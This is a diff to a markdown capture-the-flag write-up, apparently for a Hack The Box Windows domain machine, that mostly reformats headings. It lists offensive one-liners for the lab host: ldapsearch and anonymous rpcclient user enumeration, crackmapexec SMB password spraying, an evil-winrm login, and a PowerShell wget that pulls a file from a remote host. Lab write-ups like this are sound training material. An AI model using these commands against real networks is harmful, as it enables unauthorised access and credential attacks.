@@ -20,11 +20,11 @@ Short description to include any strange things to be dealt with
 ## 
 Useful Skills and Tools
 
-#### Using ldapsearch to enumerate a Windows domain
+### Using ldapsearch to enumerate a Windows domain
 
 `ldapsearch -H ldap://<ip>:<port> -x -LLL -s sub -b "DC=<domain>,DC=local"`
 
-#### Enumerating users on a Windows domain with rpcclient \(without credentials\)
+### Enumerating users on a Windows domain with rpcclient \(without credentials\)
 
 > rpcclient -U "" -N &lt;ip&gt;
 >
@@ -37,29 +37,26 @@ Useful Skills and Tools
 >
 > * rpcclient $&gt; queryuser 1601
 
-#### Bruteforcing SMB login with only usernames
+### Bruteforcing SMB login with only usernames
 
 `crackmapexec smb 10.10.10.172 -u users.txt -p users.txt`
 
-#### 
-Connect to a Windows computer through Windows Remote Management \(WinRM\)
+### Connect to a Windows computer through Windows Remote Management \(WinRM\)
 
 `evil-winrm -i <ip> -u <username> -p '<password>'`
 
-#### Use PowerShell Invoke-WebRequest \(alias: wget\) to download a file from a remote host
+### Use PowerShell Invoke-WebRequest \(alias: wget\) to download a file from a remote host
 
 `wget http://<ip>:<port>/<file_to_get> -UseBasicParsing -Outfile <file_to_save>`
 
-#### Useful Windows groups
+### Useful Windows groups
 
 * Remote Management Users
 * Azure Admins
 
-## 
-Enumeration
+## Enumeration
 
-### 
-Nmap scan
+### Nmap scan
 
 I started my enumeration with an nmap scan of `10.10.10.172`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the nmap output with a filename of `<name>`.
 
